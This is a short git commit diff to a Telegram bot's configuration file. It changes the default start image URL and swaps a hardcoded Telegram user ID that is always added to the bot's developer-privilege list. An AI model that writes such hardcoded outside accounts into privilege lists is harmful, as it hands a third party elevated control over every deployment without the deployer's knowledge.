e7b6b4a613671bf12fab4f1e11ed1820bb94643f
rohitt99 <164199173+rohitt99@users.noreply.github.com>
2024-05-26 06:51:10 +0530

    Update __init__.py
    Signed-off-by: rohitt99 <164199173+rohitt99@users.noreply.github.com>

--- FallenRobot/__init__.py
+++ FallenRobot/__init__.py
@@ -45,7 +45,7 @@ if ENV:
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
     NO_LOAD = os.environ.get("NO_LOAD", "").split()
     START_IMG = os.environ.get(
-        "START_IMG", "https://telegra.ph/file/40eb1ed850cdea274693e.jpg"
+        "START_IMG", "https://graph.org/file/7c31b0b6bcaea61e5e236.jpg"
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
     SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "DevilsHeavenMF")
@@ -142,7 +142,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DEV_USERS.add(6722550550)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
